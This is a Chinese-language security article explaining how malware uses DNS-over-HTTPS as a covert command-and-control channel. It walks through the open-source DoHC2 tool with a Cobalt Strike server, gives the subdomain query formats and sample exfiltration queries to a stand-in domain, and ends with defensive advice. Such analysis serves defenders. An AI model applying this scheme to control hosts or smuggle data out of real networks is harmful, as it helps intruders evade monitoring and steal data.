***本文仅用于技术分享与讨论，严禁用于其它用途，所带来的法律风险与本文无关。**

## 背景概述

对僵尸程序、木马等具有远控能力的恶意软件而言，C&C信道不仅是其正常运行的基本需求，也是其维持自身健壮性、隐蔽性的关键所在。其中，常见远控工具主要面临两方面问题：远控流量易被检测、被阻断、被审计；控制者身份和C&C服务器易被溯源追踪。

针对以上问题，近年来，红队在实战中研究发现了多种可利用的对抗技术，以应对网络边界的流量审计和防御人员的溯源追踪。比如：基于 DoH（DNS over
HTTPS）、Domain Fronting（域前置）、Domain Hiding（域隐藏）、Domian Borrowing（域借用）、Instant
Message（即时消息）、在线剪切板（pastbin等）、社交网络（twitter等）、云函数、云存储等公共资源的C&C信道。

![1634092791_616646f7af6830a725e3a.png!small](https://image.3001.net/images/20211013/1634092791_616646f7af6830a725e3a.png!small)

该类基于公共资源的C&C信道有一个共同特点，即控制者不再仅依赖自建C&C服务器对被控主机进行管控，而是利用互联网上开放的公共服务充当C&C服务器的角色。其优势在于：

(1)
防流量审查：被控端不与C&C服务器直接通信，而是与互联网上公开、正常的网络服务通信，将其自身产生的恶意流量伪装成正常用户的合法流量，可有效突破本地和网络边界的流量审查以及防火墙限制。

(2)
防溯源追踪：利用互联网上的公共服务中转被控端与C&C服务器之间的网络流量(或充当C&C服务器角色)，以隐藏C&C服务器的地址，可有效降低C&C服务器或BotMaster被防御人员溯源追踪的可能性。

## 本文目的

作为公共资源型C&C信道的一种方式，本文主要对DoH的产生背景、基本原理、实际案例进行概述，同时以开源工具[DoHC2](https://github.com/SpiderLabs/DoHC2)为例，讨论恶意软件在利用DoH充当C&C信道的过程中，如何设计信道运行流程、如何定义协议格式等内容，最后讨论DoH的适用场景并提出防御建议。

## DoH简介

### 1 DoH的产生

传统的DNS协议通过UDP发送DNS查询请求，通信内容没有加密，安全性较弱，易受中间人拦截和操纵。为了解决传统 DNS
的弊端，先后诞生了多种网络协议，以强化域名系统的安全性，如： DNSSEC、 DNSCrypt、 DNS over TLS、 DNS over
HTTPS等。其中，DoH是目前主流浏览器唯一支持的提高DNS安全性的协议。

![1634200016_6167e9d0091220dedea33.png!small](https://image.3001.net/images/20211014/1634200016_6167e9d0091220dedea33.png!small)

作为一种弥补现行DNS安全的新协议，DoH在通信过程中基于HTTPS发送DNS查询请求，并从某个可信DoH服务器（知名服务商提供）获取查询结果
。因为通信内容是加密传输的，所以可有效解决DNS监视和DNS劫持的问题。

![1634094884_61664f24f1f7da4b4be36.png!small?1634094885200](https://image.3001.net/images/20211013/1634094884_61664f24f1f7da4b4be36.png!small?1634094885200)

### 2 DoH的现状

目前，DoH还在标准化的过程中：RFC方面，它已经有了相应的草案，但还没正式发布。虽然尚未正式发布，但Firefox 从 62 版本已开始支持
DoH、Chrome/Chromium 从 66 版本也已开始支持 DoH。此外，Google 、Cloudflare、Quad9
等知名服务提供商也提供了支持DoH功能的DNS服务器。

![1634094923_61664f4bad419e0e79e59.png!small?1634094923985](https://image.3001.net/images/20211013/1634094923_61664f4bad419e0e79e59.png!small?1634094923985)

### 3 DoH的案例

##

虽然通过DoH可避免中间人攻击和隐私泄露的风险，然而在提供安全性的同时，DoH也存在被攻击者恶意利用的风险。据报道：

2019年7月， 360Netlab的安全人员发现首个利用 DoH的恶意软件 Godlua
，该恶意软件利用DoH协议从某域名的TXT记录中获取攻击者预留的控制命令（参考：[Godlua
Backdoor分析报告](https://blog.netlab.360.com/an-analysis-of-godlua-backdoor/)）。

2020年5月，卡巴斯基的安全人员发现伊朗APT组织OilRig（APT34）已将DoH武器化，成为第一个将DoH协议纳入其黑客安全工具库的APT组织（参考：[APT组织将DoH武器化](../news/245601.html)）。

## 信道原理

在网络通信层面，被控端与C&C服务器的通信主要有两类请求，一是被控端从C&C服务器获取攻击者下发的控制命令，二是被控端将命令的执行结果或窃取的敏感文件回传给C&C服务器。

为满足以上需求，基于DoH充当C&C信道的方式与基于DNS充当C&C信道的方式是一样的，都是通过子域名查询携带传递的信息。不同之处在于，DoH多了一层通过HTTPS包裹“DNS查询”的过程。

其中，常见DNS记录类型如下图所示：

![1634225014_61684b765f37f39f96656.png!small?1634225015038](https://image.3001.net/images/20211014/1634225014_61684b765f37f39f96656.png!small?1634225015038)

在具体实现上，恶意软件通常利用DNS TXT记录获取控制命令、利用DNS A记录(或TXT记录、AAAA记录等)回传结果信息。示例如下：

(1) 获取控制命令：通过查询子域名的TXT记录，从DNS响应中获取攻击者预留的控制命令。

![1634221447_61683d87701ef9703ac6b.png!small?1634221447688](https://image.3001.net/images/20211014/1634221447_61683d87701ef9703ac6b.png!small?1634221447688)

(2) 回传结果信息：通过查询子域名的A记录，将敏感信息发送到攻击者控制的DNS服务器。

![1634267200_6168f04035029f2f353cd.png!small?1634267200623](https://image.3001.net/images/20211015/1634267200_6168f04035029f2f353cd.png!small?1634267200623)

为什么被控端的DNS查询请求最终会达到攻击者控制的DNS服务器？ 这是NS记录在起作用。NS记录：用于指定该域名的子域名查询由哪个DNS服务器来解析。

 **备注：**
在DNS查询的过程中，如果本地DNS有缓存，则返回缓存中的内容；如果本地DNS无缓存，则从根DNS服务器递归查询，请求最终会到达NS记录所指向的服务器。（DNS递归查询）

## 信道流程

以开源工具DoHC2为例，基于DoH构建C&C信道的通信流程如图所示。其中，自建DNS服务器由攻击者搭建并控制，本质是一段Python脚本，用于中转被控端与C&C服务器之间的网络流量；C&C服务器由Cobaltstrike
Teamserver搭建部署完成，用于对被控端程序进行远程控制。二者即可单独部署，也可部署在一台服务器。

![1634522916_616cd7248b607e02d602d.png!small?1634522917208](https://image.3001.net/images/20211018/1634522916_616cd7248b607e02d602d.png!small?1634522917208)

![1634523378_616cd8f23371569bc9bb1.png!small](https://image.3001.net/images/20211018/1634523378_616cd8f23371569bc9bb1.png!small)

该工具的安装步骤可参考：https://github.com/SpiderLabs/DoHC2。在使用该工具前，需要先申请域名，并配置DNS记录。其中，使用两条NS记录只是该工具的设计，一条在获取控制命令时使用，一条在回传结果信息时使用。

（1）创建一条A记录，对应的记录值为自建DNS的IP地址；

（2）创建两条NS记录，对应的记录值为刚刚创建的A记录。

### 1 客户端构造DNS查询请求

在运行过程中，DoHC2客户端发往dns.google.com（或其它DoH服务器）的DNS查询请求如下所示，该请求最终会经公共DNS服务器，到达自建DNS服务器，进而转发给C&C服务器，实际的payload位于name字段。

https://dns.google.com/resolve?name={子域名字符串}.receive.example.org&type=TXT

https://dns.google.com/resolve?name={子域名字符串}.send.example.org&type=TXT

 **1.1 协议格式：获取控制命令**

![1634525498_616ce13a8583d2bee1e27.png!small](https://image.3001.net/images/20211018/1634525498_616ce13a8583d2bee1e27.png!small)

 **(1) 第1次查询：获取控制命令的长度大小**

"{0}.{1}.{2}", dohSocketHandle, session, receiveHostname

{0} dohSocketHandle: 客户端的唯一标志  
{1} session: 随机的session标识  
{2} receiveHostname: 子域名 receive.example.org

示例：

iyyk.bfra.receive.example.org

 **(2) 第1-n次查询：获取控制命令的实际内容（循环）**

"{0}.{1}.{2}.{3}", dohSocketHandle, pos, session, receiveHostname

dohSocketHandle: 客户端的唯一标志  
pos: 从0开始，最多1500次  
session: 随机的session标识  
receiveHostname: 子域名 receive.example.org

示例：

iyyk.bfra.0.receive.example.org

iyyk.bfra.1.receive.example.org

iyyk.bfra.2.receive.example.org

......

 **备注：** 由于单个TXT记录一般不超过255字节，因此对于控制命令过长的情况，需要发送多次DNS
TXT查询，每次获取部分字符串，最后将其拼接为原始内容。

 **1.2 协议格式：回传结果信息**

![1634550583_616d43371001a7c783a50.png!small?1634550585085](https://image.3001.net/images/20211018/1634550583_616d43371001a7c783a50.png!small?1634550585085)

![1634550845_616d443d8ad6ee975228a.png!small?1634550846399](https://image.3001.net/images/20211018/1634550845_616d443d8ad6ee975228a.png!small?1634550846399)

 **(1) 第1次查询: 告诉服务器，本次数据传输需要多少次DNS查询**

"{0}.{1}.{2}.{3}", dohSocketHandle, entries, session, sendHostname

{0} dohSocketHandle: 客户端的唯一标志  
{1} entries: 本次数据传输需要多少次查询  
{2} session: 整个session的唯一标识  
{3} sendHostname: 查询子域名 send.example.org

示例：

iyyk.25.4q9j.send.example.org

 **(2) 第1-n次查询: 开始传输待发送的数据，分片的内容位于{3}处**

"{0}.{1}.{2}.{3}.{4}", dohSocketHandle, pos, session, String.Join(".",
labels.ToArray()), sendHostname

{0} dohSocketHandle: 客户端的唯一标志  
{1} pos: 此次传输数据在整个数据块中的相对位置  
{2} session: 整个session的唯一标识  
{3} String.Join(".", labels.ToArray()): 此次传输的实际数据（最多三个数据块，由labelsPerLookup指定）  
{4} sendHostname: 查询子域名 send.example.org

示例：

iyyk.0.4q9j.kyks5hzzm8epo9sfvwakuwwr6bhsdvhtibambriwae5uezgo8t.sqlb2wb1a013lppz2psycczcyi4bb5grqawqb2pcyqcq6bler7.9dwbx3gfhv6qeibgbeinfvdbqq7kkugbvtfivwlrt1ikcp77rx.send.example.org

iyyk.1.4q9j.pnlsx2crqygl3bxcgrghzgbxht0fottyfmtrdzotna91gzv3hl.mdft2tbrvm00gmcbiptvo0z2gz0qaai2xldqsnlcfqwdlnhonq.qagal9hxyusk1z0drrku7klxheokyamii3mlv7iny44pzaibaz.send.example.org

iyyk.2.4q9j.dysua7kowwb2qdhglebdqca7t6y960egsyzaxoorbkczix9lag.nkty7xegsw2lfg6q3prn8hwkkzxm35kafl0mdmlaga94kbgyxk.xrsuoukp0mxqdc2uxfm42azefuu6x3drkrlmugy6ly0xpp9ypa.send.example.org  
......

 **备注：** 如果回传的字符串太长（或文件太大），则需要将字符串分割后传输，每次传递特定大小的内容。待DNS服务器收到所有请求后，再将分割后的信息还原。

###  **2 服务端处理DNS查询请求**

当DNS查询请求到达自建DNS服务器时，Python脚本会依据子域名的标识进行判断，以确定返回控制命令，还是接收回传结果。

![1634555439_616d562f11b7a7a9693e1.png!small](https://image.3001.net/images/20211018/1634555439_616d562f11b7a7a9693e1.png!small)

## 一些讨论

### 1 适用场景

虽然单纯基于DNS协议构建C&C信道的方式，具有较好的隐蔽性，可绕过部分防火墙的拦截。但对于本地DNS服务器而言，其通信内容是明文的，且目前对恶意DNS的检测手段也比较成熟，如：子域名的长度、元音字母个数、请求的心跳频率等因素都会引发异常行为。

![1634096220_6166545ce33efea6d4e48.png!small?1634096221550](https://image.3001.net/images/20211013/1634096220_6166545ce33efea6d4e48.png!small?1634096221550)

基于DoH协议构建C&C信道的方式，不仅通信内容可基于HTTPS协议加密，而且与高可信DoH服务的通信（而非本地DNS服务器）不会引发异常行为，避免了基于DNS的恶意行为检测机制。此外，在整个通信过程中，任何参与节点都无法获知C&C服务器的地址信息，也无法掌握全部的关键信息。

任何技术方案都不是完美的，基于DoH的C&C信道也是如此。如果受害终端向DoH服务器发送过多的DNS查询请求，尤其一些生僻域名的查询，易触发DoH服务商的异常行为检测机制。而且由于每次DNS查询仅能发送或响应特定长度的内容，所以DoH相对适合传输内容有限的情况（如：获取控制命令），不适合传输超长内容的场景（如：回传大文件）。

### 2 防御建议

对于企业的边界而言，由于DNS查询请求被HTTPS加密，无法获取明文内容，因此基于通信内容进行检测的手段无法有效发挥作用。一种比较直接的手段，便是屏蔽企业内部终端发往DoH服务器的所有请求。虽然有一定的附带损害，但由于DoH服务并未大规模应用，故不会造成实质性影响。

对于DoH服务商而言，由于DNS查询达到DoH服务器后已是明文内容，所以针对恶意DNS的检测技术在这里就有了用武之地。此外，DoH服务商也可基于恶意DNS查询请求获知被控端的主机规模，以及自建DNS服务器的地址信息，可进一步与执法机构配合以对利用DoH的恶意行为进行打击。

